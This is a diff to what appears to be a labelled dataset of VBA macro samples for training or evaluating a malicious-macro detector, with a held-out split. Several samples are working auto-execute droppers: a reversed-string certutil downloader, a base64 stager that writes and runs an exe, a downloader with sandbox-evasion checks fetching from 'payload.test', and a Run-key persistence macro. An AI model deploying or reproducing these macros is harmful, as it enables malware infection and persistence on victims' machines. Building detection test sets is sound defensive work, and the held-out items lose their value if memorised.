@@ -102,7 +102,7 @@ End Sub
 M_REVERSED_DOWNLOAD = """Sub Auto_Open()
     Dim u As String, c As String
     u = StrReverse("txt.p/tset.daolyap//:ptth")
-    c = StrReverse("exe.dmc") & " /c " & StrReverse("ehcacru- litrutrec") & " -f " & u & " %TEMP%\\p.exe"
+    c = StrReverse("exe.dmc") & " /c " & StrReverse("ehcaclru- litutrec") & " -f " & u & " %TEMP%\\p.exe"
     CreateObject(StrReverse("llehS.tpircSW")).Run c, 0
 End Sub
 """
@@ -259,6 +259,76 @@ B_HTML_BUILDER = (
     )
     + '    Page = h & "</body></html>"\nEnd Function\n'
 )
+
+# ---- held out: written in different styles, never used to brief or tune anything ---------------
+H_BASE64_STAGE = """Private Function Unb64(ByVal t As String) As Byte()
+    Dim n As Object
+    Set n = CreateObject("Microsoft.XMLDOM").createElement("b")
+    n.DataType = "bin.base64"
+    n.Text = t
+    Unb64 = n.nodeTypedValue
+End Function
+Sub Workbook_Open()
+    Dim f As Integer, p As String
+    p = Environ("APPDATA") & "\\Microsoft\\upd.exe"
+    f = FreeFile
+    Open p For Binary As #f
+    Put #f, , Unb64(Range("ZZ1").Value & Range("ZZ2").Value)
+    Close #f
+    Shell p, vbHide
+End Sub
+"""
+H_EVADE_DOWNLOAD = """Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" (ByVal c As Long, ByVal u As String, ByVal f As String, ByVal r As Long, ByVal s As Long) As Long
+Sub AutoOpen()
+    If Application.RecentFiles.Count < 3 Then Exit Sub
+    Application.Wait Now + TimeValue("0:00:40")
+    URLDownloadToFileA 0, "http://payload.test/q.bin", Environ("TEMP") & "\\q.exe", 0, 0
+    CreateObject("WScript.Shell").Run Environ("TEMP") & "\\q.exe", 0
+End Sub
+"""
+H_REGISTRY_PERSIST = """Sub Document_Open()
+    Dim sh As Object, p As String
+    Set sh = CreateObject("WScript.Shell")
+    p = Environ("APPDATA") & "\\Microsoft\\Windows\\sync.js"
+    sh.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Sync", "wscript.exe " & p, "REG_SZ"
+End Sub
+"""
+H_INVOICE = """Sub MakeInvoice()
+    Dim r As Long, total As Currency
+    For r = 2 To 40
+        total = total + Cells(r, 3).Value * Cells(r, 4).Value
+        Cells(r, 5).NumberFormat = "$#,##0.00"
+    Next r
+    Cells(42, 5).Value = total
+    ActiveSheet.ExportAsFixedFormat Type:=xlTypePDF, Filename:=ThisWorkbook.Path & "\\invoice.pdf"
+End Sub
+"""
+H_INVENTORY = """Sub SyncStock()
+    Dim src As Workbook
+    Set src = Workbooks.Open(ThisWorkbook.Path & "\\stock.xlsx", ReadOnly:=True)
+    src.Sheets(1).Range("A1:D200").Copy ThisWorkbook.Sheets("Stock").Range("A1")
+    src.Close False
+End Sub
+"""
+H_EMAIL_REPORT = """Sub SendWeekly()
+    Dim ol As Object, m As Object
+    Set ol = CreateObject("Outlook.Application")
+    Set m = ol.CreateItem(0)
+    m.To = "team@example.test"
+    m.Subject = "Weekly report"
+    m.Body = "The weekly report is attached."
+    m.Attachments.Add ThisWorkbook.FullName
+    m.Send
+End Sub
+"""
+HELDOUT: dict[str, tuple[str, str]] = {
+    "base64_stage": ("malicious", H_BASE64_STAGE),
+    "evade_download": ("malicious", H_EVADE_DOWNLOAD),
+    "registry_persist": ("malicious", H_REGISTRY_PERSIST),
+    "invoice": ("benign", H_INVOICE),
+    "inventory_sync": ("benign", H_INVENTORY),
+    "email_report": ("benign", H_EMAIL_REPORT),
+}
 
 BENIGN: dict[str, str] = {
     "report": B_REPORT,
